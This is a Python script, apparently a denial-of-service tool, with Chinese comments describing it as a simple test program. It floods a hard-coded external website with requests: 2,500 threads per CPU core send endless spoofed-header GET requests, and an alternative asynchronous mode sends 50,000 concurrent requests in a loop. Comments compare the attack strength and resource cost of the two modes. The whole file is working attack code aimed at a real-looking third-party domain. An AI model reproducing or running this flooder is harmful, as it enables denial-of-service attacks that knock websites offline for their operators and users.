from concurrent.futures import ThreadPoolExecutor , ProcessPoolExecutor
import multiprocessing
import threading
import requests
import asyncio
import aiohttp
import socket

"""
一個簡單的測試程式

無使用代理
個人電腦對有一定規模的網站
攻擊效果有限
"""

class Simulation_DDOS:
    def __init__(self):
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "cache-control": "no-cache",
            "sec-fetch-mode": "no-cors",
            "sec-fetch-site": "same-origin"
        }

    def ICMP(self):
        pass

    ###### 純線程請求 #####
    def Thread_Attack(self, AttackTarget):
        while True:
            try:
                data = requests.get(AttackTarget, headers=self.headers)
                print(f"state:{data}", flush=True)
                content_bytes = data.content
            except Exception as e:
                print(f"Error", flush=True)
                continue

    def Thread_Trigger(self, url):
        # 線程數越高攻擊力越強 , 電腦性能也消耗的越大
        for _ in range(2500):
            threading.Thread(target=self.Thread_Attack, args=(url,)).start()

    ###### 異步請求 #####
    async def Asynchronous_Attack(self, Session, AttackTarget):
        async with Session.get(AttackTarget, headers=self.headers) as response:
            await response.text()

    def Asynchronous_Trigger(self, url):
        async def Trigger():
            while True:
                async with aiohttp.ClientSession() as session:
                    work = []
                    for _ in range(50000):
                        work.append(asyncio.create_task(self.Asynchronous_Attack(session,url)))
                    await asyncio.gather(*work)
        asyncio.run(Trigger())

if __name__ == "__main__":
    ddos = Simulation_DDOS()
    cpu = multiprocessing.cpu_count() - 1

    Attack = "https://eden1113.com/"

    with ProcessPoolExecutor(max_workers=cpu) as executor:
        for _ in range(cpu):
            # 線程請求攻擊 , 簡單暴力 , 消耗資源高 , 硬體性能與網速足夠快 , 攻擊力度就夠大
            executor.submit(ddos.Thread_Trigger, Attack)

            # 異步請求攻擊 , 攻擊力度低 , 電腦資源消耗較少
            # executor.submit(ddos.Asynchronous_Trigger,Attack)